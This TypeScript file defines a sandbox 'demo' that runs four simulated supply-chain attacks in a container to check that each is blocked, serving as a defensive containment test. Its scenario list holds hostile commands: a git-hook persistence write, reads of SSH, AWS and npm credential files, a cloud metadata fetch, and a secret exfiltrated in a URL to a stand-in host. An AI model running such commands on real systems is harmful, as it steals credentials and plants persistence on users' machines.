import type { NetworkMode, SandboxConfig } from './config.js';
import { log, type Logger } from './log.js';
import { planRun, protectionMounts, type RunPlan } from './plan.js';
import type { ProjectFacts } from './project.js';

/**
 * `sandbox demo` — run real supply-chain attacks against the live sandbox and watch each one bounce
 * off a different wall. The point is trust: not "here's what the sandbox claims", but "here's a
 * credential thief and a persistence hook actually failing inside it". Every scenario is a thing
 * malicious npm packages have genuinely done (exfiltrate env secrets, plant a git hook, pivot to
 * cloud metadata), run through the SAME execute path a real install uses — no mocks, no theatre.
 *
 * Each scenario targets ONE control, so a green run is a per-control receipt:
 *   persistence-write   → read-only persistence mounts
 *   credential-theft    → the container has no host credentials to read
 *   metadata-pivot      → the metadata guard blackholes 169.254.169.254
 *   egress-exfil        → default-deny egress (and, with canaries, the honeytoken tripwire)
 */

/** How a contained attack reveals itself in the run outcome. */
export interface DemoOutcome {
  /** Exit code of the attack command inside the container. */
  code: number;
  /** Hosts the egress proxy refused. */
  deniedHosts: string[];
  /** Canary nonces caught leaving the box. */
  canaryHits: string[];
}

export interface DemoScenario {
  id: string;
  title: string;
  /** What real-world malware this imitates. */
  threat: string;
  /** The control that should stop it (printed on a pass). */
  control: string;
  /** The attack command run inside the sandbox (argv). Written so containment ⇒ a specific outcome. */
  attack: string[];
  /** The phase the attack needs: egress mode, and whether to plant canaries. */
  needs: { network: NetworkMode; canaries?: boolean };
  /** True when the outcome proves the attack was contained. */
  contained: (o: DemoOutcome) => boolean;
  /** A one-line, outcome-aware explanation for the scorecard. */
  explain: (o: DemoOutcome) => string;
}

/** Sentinel exit code the metadata-pivot probe uses to mean "I could NOT reach IMDS" (i.e. contained). */
export const IMDS_BLOCKED_CODE = 7;

export const DEMO_SCENARIOS: DemoScenario[] = [
  {
    id: 'persistence-write',
    title: 'Plant a git hook (persistence)',
    threat: 'a postinstall script writes .git/hooks/pre-commit so it runs on every future commit',
    control: 'persistence paths (.git/.husky/.github/…) are mounted read-only',
    attack: ['bash', '-c', 'echo "#!/bin/sh\\ncurl evil" > /workspace/.git/hooks/pre-commit'],
    needs: { network: 'none' },
    // On an unprotected host the redirect succeeds (exit 0); against a read-only mount it fails.
    contained: (o) => o.code !== 0,
    explain: (o) => (o.code !== 0 ? 'the write was rejected, .git is read-only inside the sandbox' : 'the hook was written, containment FAILED'),
  },
  {
    id: 'credential-theft',
    title: 'Steal host credentials',
    threat: 'a dependency reads ~/.ssh/id_rsa, ~/.aws/credentials and ~/.npmrc to exfiltrate them',
    control: 'the container starts with none of your host credentials mounted',
    attack: ['bash', '-c', 'cat ~/.ssh/id_rsa ~/.aws/credentials ~/.npmrc /workspace/.env'],
    needs: { network: 'none' },
    // `cat` exits non-zero when every target is absent — which is the whole point: there's nothing to read.
    contained: (o) => o.code !== 0,
    explain: (o) => (o.code !== 0 ? 'nothing to read, your keys, tokens and .env never entered the container' : 'a credential file was readable, containment FAILED'),
  },
  {
    id: 'metadata-pivot',
    title: 'Pivot to cloud metadata (IMDS)',
    threat: 'malware hits http://169.254.169.254/ to steal the host\'s cloud IAM role credentials',
    control: 'the metadata guard blackholes the IMDS endpoints before your command runs',
    attack: [
      'node',
      '-e',
      `fetch('http://169.254.169.254/latest/meta-data/',{signal:AbortSignal.timeout(5000)}).then(()=>{console.log('REACHED IMDS, leak');process.exit(0)}).catch(()=>{console.log('IMDS unreachable');process.exit(${IMDS_BLOCKED_CODE})})`,
    ],
    // Open-network mode is where IMDS is even routable; the guard must make it unreachable.
    needs: { network: 'on' },
    contained: (o) => o.code === IMDS_BLOCKED_CODE,
    explain: (o) => (o.code === IMDS_BLOCKED_CODE ? 'IMDS was unreachable, the guard blackholed 169.254.169.254' : 'the metadata endpoint answered, containment FAILED'),
  },
  {
    id: 'egress-exfil',
    title: 'Exfiltrate a secret over the network',
    threat: 'a script POSTs a stolen credential to an attacker-controlled host',
    control: 'default-deny egress blocks any host off the allowlist (canaries name the stolen value)',
    // git honours http_proxy, so this routes through the egress proxy exactly as a real dep fetch would.
    // The planted AWS canary rides in the URL, so a plaintext request the proxy can see exposes the nonce.
    attack: ['bash', '-c', 'git ls-remote "http://sandbox-demo-exfil.invalid/steal?k=${AWS_SECRET_ACCESS_KEY}" 2>&1; true'],
    needs: { network: 'allowlist', canaries: true },
    contained: (o) => o.deniedHosts.length > 0 || o.canaryHits.length > 0,
    explain: (o) =>
      o.canaryHits.length
        ? `egress blocked AND the canary tripped, a planted credential was caught leaving for ${o.deniedHosts.join(', ') || 'a filtered host'}`
        : o.deniedHosts.length
          ? `egress refused the attacker host(s): ${o.deniedHosts.join(', ')}`
          : 'the request was not blocked, containment FAILED',
  },
];

/**
 * Build the plan one scenario runs as. Two things the bare `run` model wouldn't give us, both load-
 * bearing for the demo to be HONEST:
 *   • install-class protection mounts spliced on top — the `run` model mounts the workspace
 *     read-write, so without these the persistence-write attack would succeed and the demo would
 *     report a failure caused by its own wiring rather than a broken boundary;
 *   • a hostile-repo config — every host grant stripped, egress reduced to the registry — so the
 *     attacks meet the real boundary, not a permissive demo config.
 * Image/build settings are inherited from `baseConfig` so the demo reuses the user's sandbox image.
 */
export function demoPlan(scenario: DemoScenario, baseConfig: SandboxConfig, facts: ProjectFacts): RunPlan {
  const config: SandboxConfig = {
    ...baseConfig,
    grants: { 'ssh-agent': false, claude: 'none', paths: [], env: [], envFiles: [] },
    egress: { allow: ['registry.npmjs.org'] },
    run: { ...baseConfig.run, network: scenario.needs.network, devPorts: false, ports: [] },
  };
  const base = planRun(config, facts, scenario.attack, {});
  return { ...base, mounts: [...base.mounts, ...protectionMounts(facts, config, { protectManifest: false })] };
}

/** Runs one scenario for real (the CLI wires this to a throwaway project + the container backend). */
export type DemoRunner = (scenario: DemoScenario) => Promise<DemoOutcome>;

/**
 * Drive every scenario through `runner`, scoring each against its `contained` predicate, and print a
 * scorecard. Returns 0 only if EVERY attack was contained — so `sandbox demo` doubles as a CI smoke
 * test that the boundary still holds. A scenario whose runner throws (e.g. backend unavailable) is
 * reported and counts as a failure, never a silent pass.
 */
export async function runDemo(runner: DemoRunner, opts: { scenarios?: DemoScenario[]; logger?: Logger } = {}): Promise<number> {
  const scenarios = opts.scenarios ?? DEMO_SCENARIOS;
  const logger = opts.logger ?? log;
  let contained = 0;
  let failed = 0;

  for (const s of scenarios) {
    logger.info(`▶ ${s.title}`);
    logger.info(`    threat : ${s.threat}`);
    let outcome: DemoOutcome;
    try {
      outcome = await runner(s);
    } catch (e) {
      logger.error(`    ERROR  : could not run scenario, ${e instanceof Error ? e.message : String(e)}`);
      failed++;
      continue;
    }
    if (s.contained(outcome)) {
      contained++;
      logger.info(`    ✓ CONTAINED by ${s.control}`);
      logger.info(`    → ${s.explain(outcome)}`);
    } else {
      failed++;
      logger.error(`    ✗ NOT CONTAINED, ${s.explain(outcome)}`);
    }
  }

  if (failed === 0) logger.info(`demo: all ${contained} attack(s) contained, the sandbox held on every control`);
  else logger.error(`demo: ${failed} of ${scenarios.length} attack(s) were NOT contained, investigate the boundary`);
  return failed === 0 ? 0 : 1;
}
